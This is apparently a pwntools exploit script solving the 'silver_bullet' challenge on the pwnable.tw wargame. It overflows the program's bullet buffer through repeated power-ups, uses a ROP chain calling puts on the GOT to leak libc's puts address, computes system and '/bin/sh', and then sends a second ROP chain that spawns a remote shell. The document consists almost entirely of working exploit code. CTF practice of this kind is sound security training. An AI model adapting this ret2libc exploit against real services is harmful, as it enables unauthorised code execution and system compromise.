from pwn import *

libc = ELF('./libc_32.so.6.2')
elf = ELF('./silver_bullet')

context(terminal=['tmux', 'new-window'])
context.log_level = 'DEBUG'

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        p = gdb.debug('./silver_bullet', 
     '''
        b *0x080488e2
        commands
            silent
        end
      ''')

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./silver_bullet')
else:
    #p = process('./silver_bullet')
    p = remote('chall.pwnable.tw', 10103)


def powerUp(value):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil("bullet :")
    p.sendline(value)

def createBullet():
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil("bullet :")
    p.sendline("aaaa")

def beat_and_leak():
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvline()
    p.recvuntil("!!\n")
    return u32(p.recv(4))

def beat():
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvline()
    p.recvuntil("!!\n")


def write3():
    createBullet()
    powerUp("baaacaaa")
    powerUp("daaaeaaa")
    powerUp("faaagaaa")
    powerUp("jaaaasdasdaaaaaahaaA")
    powerUp(p32(0x8F8FFFFF) + "aaa" + str(rop_chain))
    return beat_and_leak()

def write4():
    createBullet()
    powerUp("baaacaaa")
    powerUp("daaaeaaa")
    powerUp("faaagaaa")
    powerUp("jaaaasdasdaaaaaahaaA")
    powerUp(p32(0x8F8FFFFF) + "aaa" + str(rop_chain))
    beat()


rop_chain = ROP(elf)
rop_chain.call('puts', [elf.got['puts']])
rop_chain.call('main')

leaked_puts = write3()

print(hex(leaked_puts))

base = leaked_puts - libc.symbols['puts']
bin_shell = libc.search('/bin/sh').next() + base
system = libc.symbols['system'] + base

print(hex(bin_shell))
print(hex(system))

rop_chain = ROP(elf)
rop_chain.call(system, [bin_shell])

write4()


p.interactive()




